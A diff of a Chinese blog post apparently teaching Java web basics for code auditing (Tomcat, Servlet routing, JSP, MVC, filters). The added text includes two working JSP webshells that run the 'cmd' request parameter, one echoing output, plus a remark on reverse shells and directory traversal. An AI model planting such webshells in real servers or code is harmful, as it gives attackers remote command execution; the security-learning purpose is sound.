@@ -26,12 +26,16 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20211128141044514.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231006215631395.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023171340192.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023172921669.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212735228.png">
 <meta property="article:published_time" content="2023-09-18T09:57:16.000Z">
-<meta property="article:modified_time" content="2023-10-07T05:46:52.662Z">
+<meta property="article:modified_time" content="2023-11-21T15:46:34.438Z">
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="notes">
 <meta property="article:tag" content="Code Audit">
+<meta property="article:tag" content="notes">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20211128141044514.png">
                         
@@ -231,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          5.8k 字
         
       </span>
     
@@ -242,7 +246,7 @@
         
         
         
-          10 分钟
+          49 分钟
         
       </span>
     
@@ -298,19 +302,110 @@
 <p>在Sun的Java Servlet规范中，对Java Web应用作了这样定义：“JavaWeb应用由一组Servlet、HTML页、类、以及其它可以被绑定的资源构成。它可以在各种供应商提供的实现Servlet规范的 <strong>Servlet容器</strong> 中运行。”</p>
 <p>下图是基本的Java Web响应流程。需要注意的是，JSP在运行时也会被编译为<code>Servlet</code>类。</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20211128141044514.png" srcset="/img/loading.gif" lazyload alt="img" /></p>
-<p>我们常见的Servelet容器有：Tomcat、Weblogic等等。</p>
+<p>我们常见的Servlet容器有：Tomcat、Weblogic等等。</p>
 <h2 id="tomcat">3、Tomcat</h2>
-<p>Tomcat是一款开源的Servelet容器，在实际开发中的使用非常广泛。</p>
+<p>Tomcat是一款开源的Servlet容器，在实际开发中的使用非常广泛。</p>
 <p>对于Tomcat的目录结构，我们有这样的说明</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">bin 	: 存放启动和关闭<span class="hljs-type">Tomcat</span>的脚本文件<br>conf	: <span class="hljs-type">Tomcat</span>各种配置文件的存放文职<br>lib		: 存放<span class="hljs-type">Tomcat</span>服务器和所有Web应用程序需要访问的jar文件<br>logs	: 存放<span class="hljs-type">Tomcat</span>的日志文件<br>temp	: 存放<span class="hljs-type">Tomcat</span>运行时生成的临时文件<br>webapps	: 存放<span class="hljs-type">Tomcat</span>的Web应用程序<br>work	: <span class="hljs-type">Tomcat</span>将JSP生成的Servelet源文件及字节码存放在这个目录下。<br></code></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">bin 	: 存放启动和关闭<span class="hljs-type">Tomcat</span>的脚本文件<br>conf	: <span class="hljs-type">Tomcat</span>各种配置文件的存放文职<br>lib		: 存放<span class="hljs-type">Tomcat</span>服务器和所有Web应用程序需要访问的jar文件<br>logs	: 存放<span class="hljs-type">Tomcat</span>的日志文件<br>temp	: 存放<span class="hljs-type">Tomcat</span>运行时生成的临时文件<br>webapps	: 存放<span class="hljs-type">Tomcat</span>的Web应用程序<br>work	: <span class="hljs-type">Tomcat</span>将JSP生成的Servlet源文件及字节码存放在这个目录下。<br></code></pre></td></tr></table></figure>
 <p>Tomcat的最常见的一个配置就是设置服务器软件监听的端口的配置，大部分情况下也只需要关注这个配置即可。</p>
 <p>在<code>conf/server.xml</code>找到<code>Connector</code>配置即可完成相应的配置</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231006215631395.png" srcset="/img/loading.gif" lazyload alt="image-20231006215631395" /></p>
-<h2 id="servelet技术">4、Servelet技术</h2>
+<h2 id="servlet技术">4、Servlet技术</h2>
 <h3 id="创建程序">4.1、创建程序</h3>
+<p>具体细节参照<a target="_blank" rel="noopener" href="https://whistleh.github.io/2023/09/03/blog0031-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89-IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#%E4%B8%89java-web%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA">Java Web项目创建</a></p>
 <h3 id="目录结构">4.2、目录结构</h3>
 <p>学习代码审计，首先要了解的就是Web应用程序的目录结构。对于Java Web，它的Web目录结构相对来说比较陌生，尤其是比起常见的文件路由形式。</p>
-<p>首先，我们根据上一节创建的</p>
+<p>对于4.1我们创建的Java Web而言，它的目录结构是这样的。</p>
+<p>熟悉目录架构对于目录遍历漏洞非常有效，通过目录遍历我们可以拿到web.xml和相应的class文件，从而获取到Java Web的源码。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023171340192.png" srcset="/img/loading.gif" lazyload alt="image-20231023171340192" /></p>
+<h3 id="路由配置">4.3、路由配置</h3>
+<p>Servlet + JSP技术的路由配置其实有两种方式。</p>
+<h4 id="jsp文件路由">JSP文件路由</h4>
+<p>对于JSP文件，我们仍然可以通过文件路由的形式实现对它的访问。</p>
+<p>我们在index.jsp同目录下写入shell.jsp，看看是否能实现对它的利用，测试发现能够顺利连接。</p>
+<p>对于JSP文件，Java Web 仍然采用文件路由的形式来进行管理，这也是Java webshell的实现方式之一。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20231023172921669.png" srcset="/img/loading.gif" lazyload alt="image-20231023172921669" /></p>
+<h4 id="路由注解">路由注解</h4>
+<p>在高版本的Servlet，已经支持在Servlet类加入路由注解，从而实现路由与Servlet的绑定。</p>
+<p>可以看到如下的@WebServlet注解绑定了<code>/hello-servlet</code>路由。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <span class="hljs-comment">// Hello</span><br>        PrintWriter out = response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="web.xml配置">web.xml配置</h4>
+<p>在低版本的Servlet，必须在web.xml中写相应的配置才可以绑定路由。</p>
+<p>我们以刚刚helloServlet为例来进行说明。</p>
+<p>在web.xml中加入如下语句（记得注释掉原来的WebServlet注解）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>helloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.javaservletbeginner.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>helloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>实现了 Class -&gt; Servlet -&gt; Router 的三步绑定，创建了新的路由。</p>
+<h3 id="httpservletrequest">4.4、HttpServletRequest</h3>
+<p>Servlet API 中定义的 ServletRequest 接口类用于封装请求消息。</p>
+<p>HttpServletRequest 是专用于HTTP协议的ServletRequest 子接口，它用于封装 HTTP 请求消息。</p>
+<p>HTTPServletRequest类内部实现了许多关于HTTP请求处理的方法，例如：doGet、doPost、getParameter等方法，感兴趣的读者可以直接查看Java源码中关于这一部分的说明。</p>
+<p>需要特别注意的是请求域属性这一概念。</p>
+<p><strong>请求域属性</strong></p>
+<p>存储在ServletRequest对象中的对象称之为请求域属性，属于同一个请求的多个处理模块之间可以通过请求域属性来传递对象数据。</p>
+<p>与请求域属性相关的方法：</p>
+<ol type="1">
+<li><strong>setAttribute</strong>方法</li>
+<li>getAttribute方法</li>
+<li><strong>removeAttribute</strong>方法</li>
+<li>getAttributeNames方法</li>
+</ol>
+<p>常见的利用模式如下 ：浏览器发起请求 -&gt; Servlet处理请求 -&gt; JSP共享Servlet域属性 -&gt; 渲染JSP页面。</p>
+<h3 id="httpservletresponse">4.5、HTTPServletResponse</h3>
+<p>Servlet API中定义的ServletResponse接口类用于创建响应消息。</p>
+<p>HttpServletResponse是专用于HTTP协议的ServletResponse子接口，它用于封装HTTP响应消息。</p>
+<h3 id="重定向与转发">4.6、重定向与转发</h3>
+<p>RequestDispatcher接口</p>
+<ul>
+<li>RequestDispatcher实例对象是由Servlet引擎创建的，它用于包装一个要被其他资源调用的资源（例如，Servlet、HTML文件、JSP文件等），并可以通过其中的方法将客户端的请求转发给所包装的资源。</li>
+<li>RequestDispatcher接口中定义了两个方法：forward方法和include方法。</li>
+<li>forward和include方法接收的两个参数必须是传递给当前Servlet的service方法的那两个ServletRequest和ServletResponse对象，或者是对它们进行了包装的ServletRequestWrapper 或ServletResponseWrapper对象。</li>
+<li>获取RequestDispatcher对象的方法：<br />
+ServletContext.getRequestDispatcher （参数只能是以“/”开头的路径）<br />
+ServletContext.getNamedDispatcher<br />
+ServletRequest.getRequestDispatcher （参数可以是不以“/”开头的路径）</li>
+</ul>
+<h2 id="jsp技术">5、JSP技术</h2>
+<p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p>
+<p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>
+<p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>
+<p>在此强烈推荐JSP教程来完成基础的JSP学习</p>
+<p><a target="_blank" rel="noopener" href="https://doc.yonyoucloud.com/doc/wiki/project/jsp/overview.html">JSP教程</a></p>
+<h3 id="jsp请求">5.1、JSP请求</h3>
+<p>一般来说，你请求一个JSP资源会经历如下过程</p>
+<ul>
+<li>作为正常的页面，你的浏览器发送一个 HTTP 请求到 web 服务器。</li>
+<li>web 服务器承认一个 JSP 页面的 HTTP 请求，并将其转发给一个 JSP 引擎。这是通过使用 URL 或 JSP 页面实现的，该 JSP 页面是以<strong>.jsp</strong>结尾而不是以 .Html 结尾的。</li>
+<li>JSP 引擎从磁盘加载 JSP 页面并将其转换为一个 servlet 的内容。这种转换是非常简单的，所有模板文本转换为 println()语句，所有 JSP 元素转换为 Java 代码实现页面的相应的动态行为。</li>
+<li>JSP 引擎编译 servlet 到一个可执行的类中，并将原始请求转发给一个 servlet 引擎。</li>
+<li>调用 servlet 引擎的 web 服务器的一部分加载 Servlet 类并执行它。执行期间，Servlet 产生一个 HTML 格式的输出，servlet 引擎将该输出传递到 HTTP 响应内的 web 服务器中。</li>
+<li>web 服务器将 HTTP 响应以静态 HTML 内容的形式转发到你的浏览器中。</li>
+<li>最后 web 浏览器处理 HTTP 响应中的动态生成的 HTML 页面，就好像它是一个静态页面。</li>
+</ul>
+<h3 id="jsp语法">5.2、JSP语法</h3>
+<p>JSP的基础语法相对比较繁琐，参照上述博客即可学习JSP的基础语法。</p>
+<h3 id="jsp-webshell">5.3、JSP Webshell</h3>
+<p>学习了基础的JSP语法，我们可以来尝试一下JSP的一句话木马</p>
+<p>不过这样的Webshell是没有回显，但是可以尝试反弹shell。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)); %&gt;<br></code></pre></td></tr></table></figure>
+<p>当然也可以尝试使用输入输出流打印webshell的输出，这样就能成功使用回显打印相应的内容。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) !=  <span class="hljs-keyword">null</span>)<br>    &#123;<br>        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(in));<br><br>        PrintWriter pw = response.getWriter();<br>        String lines;<br><br>        pw.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((lines = br.readLine()) != <span class="hljs-keyword">null</span>)<br>        &#123;<br>            pw.println(lines);<br>        &#125;<br>        pw.write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="mvc架构">6、MVC架构</h2>
+<p>MVC架构是Web中的常见架构，即Model-View-Controller</p>
+<ul>
+<li>模型是应用程序的主体部分，模型表示业务数据和业务逻辑。一个模型能为多个视图提供数据，由于应用于模型的代码只需写一次就可以被多个视图重用，所以提高了代码的可重用性。</li>
+<li><strong>视图</strong>是用户看到并与之交互的<strong>界面</strong>，视图向用户显示相关的数据、接受用户的输入、<strong>不进行任何实际的业务处理</strong>。</li>
+<li>控制器接受用户的输入并调用模型和视图去完成用户的需求。控制器接收请求并决定调用哪个模型组件去处理请求，然后决定调用哪个视图来显示模型处理返回的数据</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212618863.png" srcset="/img/loading.gif" lazyload alt="img" /></p>
+<h2 id="filter过滤器">7、Filter过滤器</h2>
+<p>Filter 的基本功能是对 Servlet 容器调用 Servlet 的过程进行拦截，从而在 Servlet 进行响应处理的前后实现一些特殊的功能。</p>
+<p>我们在设计Java Web的过程中，有的时候需要对多个Servlet做横向的拦截管理，这时候Filter类就能够起到作用。</p>
+<ul>
+<li>在 Servlet API 中定义了三个接口类来开供开发人员编写 Filter 程序：Filter, FilterChain, FilterConfig</li>
+<li>Filter 程序是一个实现了 Filter 接口的 Java 类，与 Servlet 程序相似，它由 Servlet 容器进行调用和执行</li>
+<li>Filter 程序需要在 web.xml 文件中进行注册和设置它所能拦截的资源：Filter 程序可以拦截 Jsp, Servlet, 不拦截静态图片文件和静态 html 文件</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0036/image-20211128212735228.png" srcset="/img/loading.gif" lazyload alt="img" /></p>
 
                 
               </div>
@@ -353,9 +448,9 @@
       
         <a href="/tags/web/" class="print-no-link">#web</a>
       
-        <a href="/tags/notes/" class="print-no-link">#notes</a>
-      
         <a href="/tags/Code-Audit/" class="print-no-link">#Code Audit</a>
+      
+        <a href="/tags/notes/" class="print-no-link">#notes</a>
       
     </div>
   
